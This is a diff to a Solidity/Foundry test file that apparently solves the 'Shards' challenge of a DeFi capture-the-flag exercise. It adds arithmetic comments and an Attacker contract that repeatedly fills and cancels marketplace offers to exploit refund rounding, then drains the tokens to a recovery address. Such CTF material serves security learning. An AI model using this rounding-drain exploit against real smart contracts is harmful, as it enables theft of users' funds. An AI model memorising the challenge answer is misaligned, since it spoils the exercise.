@@ -82,7 +82,7 @@ contract ShardsChallenge is Test {
         for (uint256 id = 0; id < SELLER_NFT_BALANCE; id++) {
             marketplace.openOffer({nftId: id, totalShards: NFT_OFFER_SHARDS, price: NFT_OFFER_PRICE});
         }
-
+        // 750 dvt
         initialTokensInMarketplace = token.balanceOf(address(marketplace));
 
         vm.stopPrank();
@@ -114,7 +114,13 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
-        
+        // 1 shard -> 75_000e18 / 1e25 = 0.0075 dvt = 7.5e-2
+        // refund 100 * 75e15 / 1e6 = 7.5e12 can buy 1e14
+        // target: 750e18 * 1e16 / 100e18 = 7.5e16
+        // round 1: buy 100 shards cost 0, refund 7.5e12
+        // round 2: buy 1e10 shards cost 7.5e8, refund 1e10 * 75e15 / 1e6 = 7.5e20, total 7.5e20
+
+        new Attacker(marketplace, token, recovery);
     }
 
     /**
@@ -134,5 +140,24 @@ contract ShardsChallenge is Test {
 
         // Player must have executed a single transaction
         assertEq(vm.getNonce(player), 1);
+    }
+}
+
+contract Attacker {
+    constructor(ShardsNFTMarketplace marketplace, DamnValuableToken token, address recovery) {
+        attack(marketplace, token, recovery);
+    }
+
+    function attack(ShardsNFTMarketplace marketplace, DamnValuableToken token, address recovery) public {
+        token.approve(address(marketplace), type(uint256).max);
+        marketplace.fill(1, 100);
+        marketplace.cancel(1, 0);
+        console.log(token.balanceOf(address(this)));
+
+        marketplace.fill(1, 1e9);
+        marketplace.cancel(1, 1);
+        console.log(token.balanceOf(address(this)));
+
+        token.transfer(recovery, token.balanceOf(address(this)));
     }
 }
